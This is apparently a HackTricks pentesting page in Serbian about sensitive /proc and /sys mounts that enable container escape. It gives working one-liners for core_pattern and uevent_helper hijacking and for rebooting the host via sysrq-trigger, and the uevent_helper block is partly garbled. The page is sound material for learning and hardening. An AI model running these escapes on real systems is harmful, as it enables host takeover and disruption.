# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

Izlaganje `/proc` i `/sys` bez odgovarajuće izolacije prostora imena uvodi značajne bezbednosne rizike, uključujući povećanje napadačke površine i otkrivanje informacija. Ovi direktorijumi sadrže osetljive datoteke koje, ako su pogrešno konfigurisane ili pristupaju im neovlašćeni korisnici, mogu dovesti do bekstva iz kontejnera, modifikacije hosta ili pružiti informacije koje pomažu daljim napadima. Na primer, pogrešno montiranje `-v /proc:/host/proc` može zaobići AppArmor zaštitu zbog svoje putanje, ostavljajući `/host/proc` nezaštićenim.

**Možete pronaći dodatne detalje o svakoj potencijalnoj ranjivosti u** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

Ovaj direktorijum omogućava pristup za modifikaciju kernel varijabli, obično putem `sysctl(2)`, i sadrži nekoliko poddirektorijuma od značaja:

#### **`/proc/sys/kernel/core_pattern`**

- Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Omogućava definisanje programa koji će se izvršiti prilikom generisanja core datoteke sa prvih 128 bajtova kao argumentima. Ovo može dovesti do izvršavanja koda ako datoteka počinje sa cevom `|`.
- **Primer testiranja i eksploatacije**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```

#### **`/proc/sys/kernel/modprobe`**

- Detaljno opisano u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Sadrži putanju do učitača kernel modula, pozvanog za učitavanje kernel modula.
- **Primer provere pristupa**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Pomenuto u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Globalna zastavica koja kontroliše da li kernel panici ili poziva OOM killer kada dođe do OOM uslova.

#### **`/proc/sys/fs`**

- Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o datotečnom sistemu.
- Pristup za pisanje može omogućiti razne napade uskraćivanja usluge protiv hosta.

#### **`/proc/sys/fs/binfmt_misc`**

- Omogućava registraciju interpretera za nenativne binarne formate na osnovu njihovog magičnog broja.
- Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` zapisiv.
- Relevantna eksploatacija i objašnjenje:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Detaljan tutorijal: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Others in `/proc`

#### **`/proc/config.gz`**

- Može otkriti konfiguraciju kernela ako je `CONFIG_IKCONFIG_PROC` omogućeno.
- Korisno za napadače da identifikuju ranjivosti u pokrenutom kernelu.

#### **`/proc/sysrq-trigger`**

- Omogućava pozivanje Sysrq komandi, potencijalno uzrokujući trenutne restartove sistema ili druge kritične akcije.
- **Primer restartovanja hosta**:

```bash
echo b > /proc/sysrq-trigger # Reboots the host
```

#### **`/proc/kmsg`**

- Izlaže poruke kernel ring buffer-a.
- Može pomoći u kernel eksploatacijama, curenjima adresa i pružiti osetljive sistemske informacije.

#### **`/proc/kallsyms`**

- Lista kernel eksportovane simbole i njihove adrese.
- Osnovno za razvoj kernel eksploatacija, posebno za prevazilaženje KASLR-a.
- Informacije o adresama su ograničene sa `kptr_restrict` postavljenim na `1` ili `2`.
- Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfejs sa kernel memorijskim uređajem `/dev/mem`.
- Istorijski ranjiv na napade eskalacije privilegija.
- Više o [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Predstavlja fizičku memoriju sistema u ELF core formatu.
- Čitanje može otkriti sadržaj memorije host sistema i drugih kontejnera.
- Velika veličina datoteke može dovesti do problema sa čitanjem ili padom softvera.
- Detaljna upotreba u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternativni interfejs za `/dev/kmem`, predstavlja kernel virtuelnu memoriju.
- Omogućava čitanje i pisanje, što omogućava direktnu modifikaciju kernel memorije.

#### **`/proc/mem`**

- Alternativni interfejs za `/dev/mem`, predstavlja fizičku memoriju.
- Omogućava čitanje i pisanje, modifikacija sve memorije zahteva rešavanje virtuelnih do fizičkih adresa.

#### **`/proc/sched_debug`**

- Vraća informacije o raspoređivanju procesa, zaobilazeći PID namespace zaštite.
- Izlaže imena procesa, ID-eve i cgroup identifikatore.

#### **`/proc/[pid]/mountinfo`**

- Pruža informacije o tačkama montiranja u prostoru imena montiranja procesa.
- Izlaže lokaciju kontejnera `rootfs` ili slike.

### `/sys` Vulnerabilities

#### **`/sys/kernel/uevent_helper`**

- Koristi se za rukovanje kernel uređajima `uevents`.
- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom `uevent` okidača.
- **Primer za eksploataciju**: %%%bash

#### Kreira payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Pronalazi putanju hosta iz OverlayFS montiranja za kontejner

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Postavlja uevent_helper na maliciozni helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Okida uevent

echo change > /sys/class/mem/null/uevent

#### Čita izlaz

cat /output %%%

#### **`/sys/class/thermal`**

- Kontroliše postavke temperature, potencijalno uzrokujući DoS napade ili fizičku štetu.

#### **`/sys/kernel/vmcoreinfo`**

- Curi adrese kernela, potencijalno kompromitujući KASLR.

#### **`/sys/kernel/security`**

- Sadrži `securityfs` interfejs, omogućavajući konfiguraciju Linux Security Modules kao što je AppArmor.
- Pristup može omogućiti kontejneru da onemogući svoj MAC sistem.

#### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**

- Izlaže interfejse za interakciju sa EFI varijablama u NVRAM-u.
- Pogrešna konfiguracija ili eksploatacija može dovesti do "brick"-ovanih laptopova ili nebootabilnih host mašina.

#### **`/sys/kernel/debug`**

- `debugfs` nudi "bez pravila" debagiranje interfejsa za kernel.
- Istorija bezbednosnih problema zbog svoje neograničene prirode.

### References

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
